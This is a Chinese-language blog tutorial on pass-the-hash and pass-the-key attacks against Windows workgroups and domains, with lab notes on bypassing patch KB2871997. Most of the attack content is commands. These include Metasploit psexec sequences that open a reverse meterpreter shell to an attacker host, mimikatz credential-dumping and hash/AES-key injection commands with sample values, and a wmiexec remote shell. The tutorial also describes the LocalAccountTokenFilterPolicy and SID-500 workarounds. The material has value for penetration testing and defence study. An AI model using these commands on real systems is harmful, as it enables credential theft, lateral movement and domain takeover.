**目录**



[哈希传递攻击](#t0 "哈希传递攻击")



[MSF进行哈希传递攻击PtH(工作组)](#t1 "MSF进行哈希传递攻击PtH(工作组)")



[MSF进行哈希传递攻击PtH(域)](#t2 "MSF进行哈希传递攻击PtH(域)")



[mimikatz进行哈希传递攻击PtH(工作组)](#t3 "mimikatz进行哈希传递攻击PtH(工作组)")



[mimikatz进行哈希传递攻击PtH(域)](#t4 "mimikatz进行哈希传递攻击PtH(域)")



[使用AES进行Key传递攻击(PTK,Pass The Key)](#t5 "使用AES进行Key传递攻击(PTK,Pass The Key)")



[更新KB2871997补丁产生的影响](#t6 "更新KB2871997补丁产生的影响")



[实验](#t7 "实验")



* * *



哈希传递攻击

------



[哈希](https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020)传递攻击是基于NTLM认证的一种攻击方式。哈希传递攻击的利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用NTLM认证的一种缺陷，利用用户的密码哈希值来进行NTLM认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器。



**哈希传递攻击适用情况**：



**在工作组环境中：**



*   Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。

*   Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。



**在域环境中：**



*   只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。



关于NTLM认证：[NTLM认证](https://blog.csdn.net/qq_36119192/article/details/85941222#NTLM%E7%9A%84%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%28%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83%E4%B8%AD%29 "NTLM认证")



### MSF进行哈希传递攻击PtH(工作组)



有些时候，当我们获取到了某台主机的 administrator 用户的密码哈希值 ，并且该主机的445端口打开着。我们则可以利用 exploit/windows/smb/psexec 模块用MSF进行远程登录(哈希传递攻击)。这个是rhost可以是一个主机，也可以设置一个网段。



这里目标主机的WindowsVista之后的机器，所以只能使用administrator用户进行攻击。



**工作组环境，必须是administrator用户**



```
msf > use  exploit/windows/smb/psexec      
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp      
msf exploit(psexec) > set lhost 192.168.10.27      
msf exploit(psexec) > set rhost 192.168.10.14      
msf exploit(psexec) > set smbuser Administrator      
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了      
msf exploit(psexec) > exploit
```




![](https://img-blog.csdnimg.cn/20181129171249927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



### MSF进行哈希传递攻击PtH(域)



当我们获取到了域管理员组内用户的密码哈希值 ，并且该主机的445端口打开着。我们则可以利用 exploit/windows/smb/psexec 模块用MSF进行哈希传递攻击。



**域环境，域管理员组内用户即可**



```
msf > use  exploit/windows/smb/psexec      
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp      
msf exploit(psexec) > set lhost 192.168.10.11      
msf exploit(psexec) > set rhost 192.168.10.131      
msf exploit(psexec) > set smbuser test   #test用户在域管理员组内，注意这里不需要写域前缀      
msf exploit(psexec) > set smbpass AADA8EDA23213C020B0C478392B5469F:51B7F7DCA9302C839E48D039EE37F0D1      
msf exploit(psexec) > exploit
```




![](https://img-blog.csdnimg.cn/20200209211212868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



### mimikatz进行哈希传递攻击PtH(工作组)



*   Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。

*   Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。



```
privilege::debug    #先提权      
#使用administrator用户的NTLM哈希值进行攻击      
sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希
```




**Windows Server 2003**



本地管理员：



*   administrator

*   xie



![](https://img-blog.csdnimg.cn/20200406114421333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20200406114459609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



**Windows Server 2008** 



本地管理员：



*   administrator

*   xie



![](https://img-blog.csdnimg.cn/2020040611463187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20200406114705838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



### mimikatz进行哈希传递攻击PtH(域)



在域环境中，当我们获得了 **域管理员组内用户** 的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域内任何一台机器(包括域控)进行哈希传递攻击。执行完命令后，会弹出CMD窗口，在弹出的CMD窗口我们可以访问域内任何一台机器。前提是我们必须拥有域内任意一台主机的本地管理员权限和域管理员的密码NTLM哈希值。



*   域：xie.com

*   域控：WIN2008.xie.com

*   普通域主机：WIN2003

*   域管理员：test

*   域普通用户：hack



```
privilege::debug    #先提权       
#使用域管理员test的NTLM哈希值对域控进行哈希传递攻击,域用户test在域管理员组中      
sekurlsa::pth  /user:test  /domain:xie.com  /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc
```




![](https://img-blog.csdnimg.cn/20200406130008802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



在弹出的cmd窗口中，使用wmiexec.vbs进行验证



```
cscript wmiexec.vbs /shell Win2008
```




![](https://img-blog.csdnimg.cn/20200406120345892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



只有域管理员的NTLM哈希值才可以进行哈希传递攻击，域普通用户的NTLM哈希值无法进行哈希传递攻击



![](https://img-blog.csdnimg.cn/20200406130052495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



### 使用AES进行Key传递攻击(PTK,Pass The Key)



前提：只适用于域环境，并且目标主机需要安装 KB2871997补丁



**获取AES凭证**



```
privilege::debug      
sekurlsa::ekeys          #获取kerberos加密凭证
```




![](https://img-blog.csdnimg.cn/20200406190441956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20200406193535211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



**利用获得到的AES256或AES128进行Key攻击**



```
privilege::debug      
#使用AES-256进行Key传递攻击      
sekurlsa::pth /user:administrator /domain:xie.com /aes256:1a39fa07e4c96606b371fe12334848efc60d8b3c4253ce6e0cb1a454c7d42083      
#使用AES-128进行Key传递攻击      
sekurlsa::pth /user:administrator /domain:xie.com /aes128:4728551c859bbe351e9c11b5d959163e
```




域控未打 KB2871997 补丁前，无法使用 Key传递攻击 



![](https://img-blog.csdnimg.cn/20200406193830146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20200406193928804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



但是当我在域控上打上 KB2871997补丁后，Ke传递攻击仍然无法使用！这里不知道为什么。



![](https://img-blog.csdnimg.cn/2020040619461731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20200406195630758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



相关文章：[域渗透——Pass The Hash & Pass The Key](http://www.tiejiang.org/23508.html "域渗透——Pass The Hash & Pass The Key")



更新KB2871997补丁产生的影响

------------------



微软在2014年5月13日发布了针对Pass The [Hash](https://so.csdn.net/so/search?q=Hash&spm=1001.2101.3001.7020)的更新补丁KB2871997和针对GPP(Group Policy Preference)组策略首选项漏洞的更新补丁 KB2928120 。其中KB2871997补丁标题为`"Update to fix the Pass-The-Hash Vulnerability",`而在一周后却把标题改成了`"Update to improve credentials protection and management"`。事实上，这个补丁不仅能够缓解PTH，还能阻止mimikatz 抓取明文密码。KB2871997 补丁将使本地帐号不再可以用于远程接入系统，不管是 Network logon 还是 Interactive login。其后果就是：攻击者无法通过本地管理员权限对远程计算机使用 Psexec、WMI、smbexec、IPC 等，也无法访问远程主机的文件共享等，但是SID=500的用户不受影响！



在实际测试中，更新KB2871997之后，使用普通管理员账号无法使用常规的哈希传递方法进行横向移动，但 administrator(SID=500) 账号例外，使用该账号的散列值依然可以进行哈希传递攻击。这里需要强调的是 SID=500 的账号。即使将administrator账号改名，也不会影响SID的值。所以，如果攻击者使用SID为500的账号进行哈希传递攻击，就不会受到KB2871997的影响。如果是域环境，在本地管理员组中的域用户均能使用PTH攻击，不受该补丁影响。



### 实验



*   Windows Server 2008R2：192.168.10.20

*   管理员：administrator  、 xie



打上 KB2871997 补丁后，使用 administrator 账号依然可以成功进行哈希传递攻击，使用管理员账号 xie 无法进行哈希传递攻击。



![](https://img-blog.csdnimg.cn/20200406111413392.png)



![](https://img-blog.csdnimg.cn/20200406111518196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20200406111551290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



将 administrator 账号重命名为 admin 账号后，由于不存在 administrator 账号了，所以无法使用administrator 账号进行哈希传递攻击，但是可以使用  admin 账号紧进行哈希传递攻击，因为 admin 账号的SID值为 500。



![](https://img-blog.csdnimg.cn/20200406111809988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/2020040611184499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20200406111920426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



修改目标机器的 **LocalAccountTokenFilterPolicy** 为1后，使用普通管理员账号 xie 也可进行哈希传递攻击。传送门：[LocalAccountTokenFilterPolicy](https://xie1997.blog.csdn.net/article/details/105336368 "LocalAccountTokenFilterPolicy")



![](https://img-blog.csdnimg.cn/20200406112248662.png)



![](https://img-blog.csdnimg.cn/20200406112717494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



**总结**：其实 KB2871997 的补丁并没有多大的用处，由于在 Windows Vista 时代，微软就通过将**LocalAccountTokenFilterPolicy** 值默认设置为 0 来禁止非administrator账号的远程连接(包括哈希传递攻击)，但是administrator用户不受影响。即使目标主机更新了KB2871997的补丁，仍然可以使用PID=500的用户进行哈希传递攻击，而 PID=500 的用户默认为 aministrator，所以仍然可以使用administrator用户进行哈希传递攻击。并且在打了KB2871997 补丁的机器上，通过将**LocalAccountTokenFilterPolicy**设置为1，也还是可以使用普通管理员账号进行哈希传递攻击。



 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")



![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg) 



相关文章：[五月，渗透师不得不知的微软更新](https://www.freebuf.com/articles/system/35211.html "五月，渗透师不得不知的微软更新")



                  [刨根问底：Hash传递攻击原理探究](https://www.freebuf.com/articles/terminal/80186.html "刨根问底：Hash传递攻击原理探究")